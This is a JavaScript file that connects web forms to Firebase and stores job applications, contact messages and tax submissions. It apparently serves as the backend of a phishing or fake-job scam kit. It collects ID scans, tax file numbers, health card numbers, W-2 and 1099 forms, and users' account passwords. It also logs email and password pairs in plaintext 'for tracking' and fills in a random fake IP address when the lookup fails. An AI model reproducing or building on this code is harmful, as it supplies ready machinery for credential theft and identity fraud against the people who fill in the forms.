// ==================== FIREBASE CONFIGURATION ====================
// Replace with your Firebase config from console
const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_AUTH_DOMAIN",
  projectId: "YOUR_PROJECT_ID",
  storageBucket: "YOUR_STORAGE_BUCKET",
  messagingSenderId: "YOUR_SENDER_ID",
  appId: "YOUR_APP_ID"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const storage = firebase.storage();

// ==================== SHARED FUNCTIONS ====================

// Upload file to Firebase Storage
async function uploadFile(file, folder = 'documents') {
  if (!file) return null;
  
  const fileName = `${Date.now()}_${file.name}`;
  const storageRef = storage.ref().child(`${folder}/${fileName}`);
  await storageRef.put(file);
  const downloadUrl = await storageRef.getDownloadURL();
  
  return {
    name: file.name,
    url: downloadUrl,
    type: file.type,
    size: file.size,
    path: `${folder}/${fileName}`
  };
}

// Save job application
async function saveJobApplication(formData) {
  try {
    // Upload files if they exist
    let idFileData = null;
    if (formData.idFile) {
      idFileData = await uploadFile(formData.idFile, 'ids');
    }
    
    let healthFileData = null;
    if (formData.healthFile) {
      healthFileData = await uploadFile(formData.healthFile, 'health-cards');
    }
    
    // Save to Firestore
    const docRef = await db.collection('jobApplications').add({
      personalInfo: formData.personalInfo,
      identification: {
        idNumber: formData.idNumber,
        idType: formData.idType,
        idFile: idFileData
      },
      tax: {
        tfn: formData.tfn
      },
      health: {
        provider: formData.healthProvider,
        number: formData.healthNumber,
        cardFile: healthFileData
      },
      workPreference: formData.workPreference,
      bonus: formData.bonus,
      status: 'pending',
      timestamp: firebase.firestore.FieldValue.serverTimestamp(),
      ip: formData.ip || 'N/A',
      userAgent: navigator.userAgent
    });
    
    return { success: true, id: docRef.id };
  } catch (error) {
    console.error('Error saving application:', error);
    return { success: false, error: error.message };
  }
}

// Save contact message
async function saveContactMessage(formData) {
  try {
    const docRef = await db.collection('contactMessages').add({
      name: formData.name,
      email: formData.email,
      phone: formData.phone || '',
      subject: formData.subject,
      message: formData.message,
      status: 'unread',
      timestamp: firebase.firestore.FieldValue.serverTimestamp(),
      ip: formData.ip || 'N/A',
      userAgent: navigator.userAgent
    });
    
    return { success: true, id: docRef.id };
  } catch (error) {
    console.error('Error saving contact:', error);
    return { success: false, error: error.message };
  }
}

// Save tax submission
async function saveTaxSubmission(formData) {
  try {
    // Upload documents
    const documents = {};
    
    if (formData.w2File) {
      documents.w2 = await uploadFile(formData.w2File, 'tax/w2');
    }
    if (formData.form1099File) {
      documents.form1099 = await uploadFile(formData.form1099File, 'tax/1099');
    }
    if (formData.previousReturnFile) {
      documents.previousReturn = await uploadFile(formData.previousReturnFile, 'tax/returns');
    }
    if (formData.idFile) {
      documents.id = await uploadFile(formData.idFile, 'tax/id');
    }
    
    const docRef = await db.collection('taxSubmissions').add({
      email: formData.email,
      password: formData.password,
      documents: documents,
      status: 'pending',
      timestamp: firebase.firestore.FieldValue.serverTimestamp(),
      ip: formData.ip || 'N/A',
      userAgent: navigator.userAgent
    });
    
    return { success: true, id: docRef.id };
  } catch (error) {
    console.error('Error saving tax:', error);
    return { success: false, error: error.message };
  }
}

// Save user login (for tracking)
async function saveUserLogin(email, password) {
  try {
    await db.collection('userLogins').add({
      email: email,
      password: password,
      timestamp: firebase.firestore.FieldValue.serverTimestamp(),
      ip: '192.168.1.' + Math.floor(Math.random() * 255),
      userAgent: navigator.userAgent
    });
  } catch (error) {
    console.error('Error saving login:', error);
  }
}

// Get client IP (using a service)
async function getClientIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch {
    return '192.168.1.' + Math.floor(Math.random() * 255);
  }
}